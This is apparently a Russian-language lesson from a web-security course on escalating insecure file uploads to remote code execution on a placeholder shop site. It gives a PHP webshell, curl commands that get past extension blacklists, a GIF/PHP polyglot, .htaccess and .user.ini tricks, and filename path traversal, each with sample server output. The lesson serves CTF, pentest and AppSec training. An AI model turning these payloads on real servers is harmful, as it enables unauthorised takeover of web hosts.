## Вопрос, с которого всё начинается

Почти на любом сайте есть место, куда можно что-то приложить: аватар, резюме, вложение в заявку. Ты отправляешь картинку — она появляется на странице. А что, если отправить не картинку, а **свой код**? Если сервер сохранит его туда, откуда файлы исполняются, то твой код запустится на сервере. Это и есть путь к RCE (выполнению команд на чужой машине).

Сегодня мы пройдём этот путь целиком на одном примере: одна форма загрузки аватара и пять слоёв защиты, которые мы обойдём по очереди.

## Наш пример

Есть магазин на `app.example`. В личном кабинете есть форма «сменить аватар». Начнём с безобидного — загрузим настоящую картинку и посмотрим, что сервер отвечает.

```bash
$ curl -s -F 'file=@cat.jpg;type=image/jpeg' https://app.example/profile/avatar
{"ok":true,"url":"/uploads/avatars/8f3a1c.jpg"}
```

Сервер вернул путь, по которому файл теперь доступен: `/uploads/avatars/8f3a1c.jpg`. Он ещё и **переименовал** файл в случайное имя. Это важная деталь: значит, просто загрузить `shell.php` и запросить `/uploads/shell.php` не выйдет — имя не наше.

И всё же форма сохраняет файл на диск и отдаёт его из веба. Вопрос, который теперь нас ведёт: **исполняется ли этот файл, если дать ему исполняемое расширение?**

## Шаг 1: что такое «исполняемый» файл на сервере

Веб-сервер сам по себе файлы не выполняет. Он отдаёт их как есть. Но если рядом стоит обработчик (например, PHP), то для файлов с расширением `.php` он не отдаёт текст, а **запускает** его и возвращает результат. Так `<?php system($_GET["c"]); ?>` — код, который выполнит команду из параметра `c`, — превращается в webshell: маленький скрипт, через который можно запускать команды прямо в браузере.

Значит, план такой: заставить сервер принять файл с исполняемым расширением (`.php` для PHP-сайта, `.jsp` для Java, `.aspx` для .NET) и не переименовать его в `.jpg`.

Пробуем в лоб:

```bash
$ curl -s -F 'file=@shell.php' https://app.example/profile/avatar
{"error":"extension not allowed"}
```

Сервер проверил расширение и отказал. Это **чёрный список** (или белый) расширений — первый слой защиты. Обходим.

## Шаг 2: обходим проверку расширения

Наивная защита запрещает ровно строку `.php`. Но PHP-обработчик в Apache часто настроен исполнять и «родственные» расширения. Проверим несколько:

```bash
$ for e in phtml php5 pht php7 phps; do
>   cp shell.php shell.$e
>   printf '%-6s -> ' ".$e"
>   curl -s -F "file=@shell.$e" https://app.example/profile/avatar
>   echo
> done
.phtml -> {"ok":true,"url":"/uploads/avatars/1b2c.php"}
.php5  -> {"error":"extension not allowed"}
.pht   -> {"ok":true,"url":"/uploads/avatars/7d4e.php"}
.php7  -> {"error":"extension not allowed"}
.phps  -> {"error":"extension not allowed"}
```

Интересно: сервер вернул URL с `.php` в конце, хотя мы отправили `.phtml`. Значит, он не просто запрещает список, а **нормализует** имя — и на выходе получилось `.php`! Иногда так делают, чтобы «причесать» расширение, и это само создаёт дыру. Теперь запросим файл:

```bash
$ curl -s 'https://app.example/uploads/avatars/1b2c.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`uid=33(www-data)` — это вывод команды `id`, выполненной **на сервере**. У нас RCE: мы выполняем команды от имени веб-сервера. Артефакт получен.

## Шаг 3: если проверка идёт по содержимому

Другой сайт может проверять не имя, а **тип файла по содержимому**. Тип определяется по первым байтам файла — их называют *magic bytes* (например, `FF D8 FF` у JPEG, `GIF89a` у GIF, `%PDF` у PDF). Слабое место: проверяющие смотрят только начало, а остальное содержимое не анализируют.

Тогда делают *polyglot* — файл, который одновременно валидная картинка и валидный код:

```bash
$ printf 'GIF89a;<?php system($_GET["c"]); ?>' > shell.gif
$ curl -s -F 'file=@shell.gif;type=image/gif' https://app.example/profile/avatar
{"ok":true,"url":"/uploads/avatars/9c0f.gif"}
```

Функция проверки (`getimagesize`) видит `GIF89a` в начале и пропускает файл. Если сервер потом исполняет `.gif` (плохая конфигурация) — это снова webshell. Если нет — polyglot всё равно пригодится позже.

## Шаг 4: белый список — как быть, если разрешены только `.jpg`

Самый строгий вариант: разрешены только `.jpg`/`.png`, и точка. Кажется, тупик. Но есть обход через **конфигурационные файлы** самого сервера. Если форма позволяет загрузить файл без расширения — например `.htaccess` (конфиг Apache) — его можно «научить» исполнять `.jpg` как PHP.

```bash
$ printf 'AddType application/x-httpd-php .jpg' > .htaccess
$ curl -s -F 'file=@.htaccess' https://app.example/profile/avatar
{"ok":true,"url":"/uploads/avatars/.htaccess"}
$ curl -s -F 'file=@shell.jpg;type=image/jpeg' https://app.example/profile/avatar
{"ok":true,"url":"/uploads/avatars/aa11.jpg"}
$ curl -s 'https://app.example/uploads/avatars/aa11.jpg?c=id'
uid=33(www-data) gid=33(www-data)
```

Теперь Apache считает `.jpg` PHP-скриптом. `shell.jpg` — это polyglot из шага 3 (валидная картинка + PHP-код). Белый список расширений обойдён, потому что `.htaccess` «не имеет исполняемого расширения» и в список не входит.

Для PHP-FPM аналог — `.user.ini` со строкой `auto_prepend_file=shell.jpg`: он заставляет подключать наш файл перед каждым скриптом в директории.

## Шаг 5: имя файла как ещё один вход

Мы заметили, что сервер переименовывает файлы. Но не все так делают. Если сервер берёт имя из multipart-запроса как есть, в него можно вписать путь:

```bash
$ curl -s -F 'file=@shell.php;filename=../../../../var/www/html/shell.php' https://app.example/upload
```

`../` — это «на уровень выше» в файловой системе. Так файл записывается **за пределы** папки загрузок, прямо в webroot. Родственный приём — *zip-slip*: если сайт принимает архив и распаковывает его, внутри zip можно положить запись с именем `../../shell.php`, и при распаковке файл вылезет наружу. Об этом — в уроке `web-zip-slip`.

## Что мы теперь знаем

- Загрузка ведёт к RCE, только если файл **исполняется** и его расширение «исполняемое»; загрузка ≠ RCE.
- Защита — слои: расширение, тип по заголовку, тип по содержимому, переименование, место хранения.
- Чёрный список обходится родственными расширениями (`.phtml`, `.pht`) и регистром.
- Проверку по содержимому обходит polyglot (валидная картинка + код).
- Белый список обходят через `.htaccess`/`.user.ini`.
- Имя файла — отдельный вход: `filename=../` и zip-slip пишут вне папки загрузок.
- Доказательство — не «файл загрузился», а `?c=id` → `uid=33(www-data)`.

## На что смотреть дальше

- **Определи, какие проверки реально стоят.** Загрузи `.jpg`, потом `.php`, потом `.phtml` — по ответам поймёшь, чёрный список это или белый.
- **Проверь, отдаётся файл как статика или исполняется.** Запроси загруженный файл; если видишь исходный текст — это не RCE, а утечка кода.
- **MIME по заголовку ≠ MIME по содержимому.** Первое обходится сменой `Content-Type`, второе — polyglot.
- **Не игнорируй имя файла.** `filename=../` и zip-slip — частая причина записи вне директории.
- **Загрузка без RCE всё ещё ценна:** HTML/SVG даёт XSS, SVG/DOCX — XXE, SVG с внешней сущностью — SSRF.
- **Только с согласия.** Заливка webshell — это изменение прода; сначала убедись, что тест санкционирован.

## Куда дальше

В следующем уроке (`web-zip-slip`) мы возьмём сайт, который принимает zip-архив и распаковывает его, и покажем, как имя записи внутри архива пишет файл куда угодно. А пока главное запомни: загрузка — это слои защиты, и каждый слой имеет свой обход; но доказательство одно — **вывод команды с сервера**.

## Где пригодится

- **CTF (Web):** загрузка файлов — классический путь к RCE и чтению флага; фильтры и их обход — суть задачи.
- **Bug bounty:** небезопасная загрузка = critical (RCE/XSS); отчёт ценится за точную демонстрацию обхода.
- **Пентест:** загрузка — обязательный пункт тестирования; успех часто даёт foothold.
- **Работа (AppSec):** whitelisting, magic-bytes, хранение вне webroot — базовые меры, которые внедряет безопасник.
